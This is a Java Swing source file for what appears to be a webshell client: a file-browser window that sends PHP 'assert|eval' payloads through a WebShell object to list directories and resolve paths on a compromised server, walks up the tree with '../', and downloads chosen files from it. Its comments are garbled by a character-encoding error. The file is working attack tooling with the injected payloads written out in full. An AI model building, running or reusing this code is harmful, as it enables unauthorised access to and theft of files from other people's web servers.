import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.border.TitledBorder;
import javax.swing.table.DefaultTableModel;
import javax.swing.text.DefaultCaret;
import javax.swing.JTextPane;
import javax.swing.ListSelectionModel;
import javax.swing.text.Document;
import javax.swing.JLabel;
import javax.swing.JTable;
import java.awt.Font;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.Point;
import java.awt.*;
import javax.swing.JOptionPane;

public class FileGui extends JFrame {	
	private JButton btn_back; //������һ��Ŀ¼��button
	private JLabel lab_cwd = new JLabel("",JLabel.CENTER);// ��ǰ·���ı�ǩ
	private JTable jt_file; //�ļ��б��JTable
	private String ls_file; //��ǰĿ¼���ļ��б�
	private String cwd; //��ǰĿ¼��
	private String xwd="./";//���Ŀ¼
	private String [] files;
	
	String[] columnNames = { "����","����" };
	DefaultTableModel tableModel = new DefaultTableModel(columnNames, 0);
	
	//�г���ǰĿ¼���ļ���payload
	private String payload1; 
	//��ȡ��ǰ·����payload
	private String payload2;
	
	public FileGui(WebShell webshell) {
		try {
		webshell.getKeyAndCookie();
		}catch(Exception e) {
			System.out.println(e.getMessage());
		}
		getFileInformation(webshell);
		
		jt_file = new JTable(tableModel) {
			public boolean isCellEditable(int row, int column) {
				return false;
			}// ��������༭
		};
		
		// �����С
		this.setPreferredSize(new Dimension(800, 500));
		try {
			setIconImage(new ImageIcon(getClass().getResource("images/logo.png")).getImage());
		}catch(Exception e) {
			System.out.println(e.getMessage());
		} 
		this.setTitle("�ļ��鿴");
		
		lab_cwd.setFont(new Font("TimesRoman", Font.PLAIN, 20));

		TitledBorder titledBorder = new TitledBorder("�ļ�����");
		JPanel topPanel = new JPanel(new BorderLayout());
		topPanel.setBorder(titledBorder);
		
		topPanel.add(lab_cwd,BorderLayout.WEST);
		topPanel.add(btn_back = new JButton("����"), BorderLayout.EAST);
		
		btn_back.addActionListener(new ActionListener()
		{
		  public void actionPerformed(ActionEvent e)
		  {
			  back(webshell);
		  }
		});
		
		this.getContentPane().add(topPanel, BorderLayout.NORTH);
		
		jt_file.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);// ��ֹ��ѡ
		jt_file.setFont(new Font("Menu.font", Font.PLAIN, 20)); // ���������С
		jt_file.setBounds(30, 40, 200, 300);
		jt_file.setRowHeight(25);
		
		jt_file.addMouseListener(new MouseAdapter() {
		    public void mousePressed(MouseEvent mouseEvent) {
		        JTable table =(JTable) mouseEvent.getSource();
		        Point point = mouseEvent.getPoint();
		        int row = table.rowAtPoint(point);
		        if (mouseEvent.getClickCount() == 2 && table.getSelectedRow() != -1) {
		        	getFileInformation(webshell,row);
		        }
		    }
		});
		
		JScrollPane sp = new JScrollPane(jt_file);
		this.add(sp);
	}
	
	private void getFileInformation(WebShell webshell) {
		try {
		payload1 = "assert|eval('echo \"[S]\";foreach (glob(\""+ xwd +"*\") as $filename){if(is_dir($filename)){echo \"folder\".$filename.\"<br>\";}else{echo \"file\".$filename.\"<br>\";};}echo \"[E]\";')";
		payload2 = "assert|eval('echo \"[S]\";echo realpath(\""+ xwd +"\");echo \"[E]\";')";
		ls_file = webshell.sendPayload(payload1); //��ǰĿ¼�µ��ļ����
	    cwd = webshell.sendPayload(payload2);//��ǰĿ¼��
	    lab_cwd.setText(cwd); 
	    files = ls_file.split("<br>");
	    for (int i = 0; i < files.length; i++) {
			String type = files[i].substring(0,files[i].indexOf("./"));
			String name = files[i].substring(files[i].lastIndexOf("/")+1,files[i].length());
			Object[] data = { name,type };
			tableModel.addRow(data);
		}
		}catch(Exception e) {
			System.out.println(e.getMessage());
		}
		tableModel.fireTableDataChanged();//����JTable
	}
	
	private void getFileInformation(WebShell webshell,int moveto) {
		if (files[moveto].substring(0, files[moveto].indexOf("./")).equals("folder")) {
			xwd += files[moveto].substring(files[moveto].lastIndexOf("/"),files[moveto].length())+"/";
			tableModel.setRowCount(0);
			getFileInformation(webshell);
		}
		else {
			webshell.DownLoadFile(files[moveto].substring(files[moveto].indexOf("./")+2,files[moveto].length()));
			JOptionPane.showMessageDialog(jt_file, "�ļ����سɹ�");
			return;
		}
	}
	
	private void back(WebShell webshell) {
		xwd += "../";
		tableModel.setRowCount(0);
		getFileInformation(webshell);
	}
	
	/* ��ʾFrame */
	public void showFrame() {
		this.pack();
		this.setVisible(true);
	}
}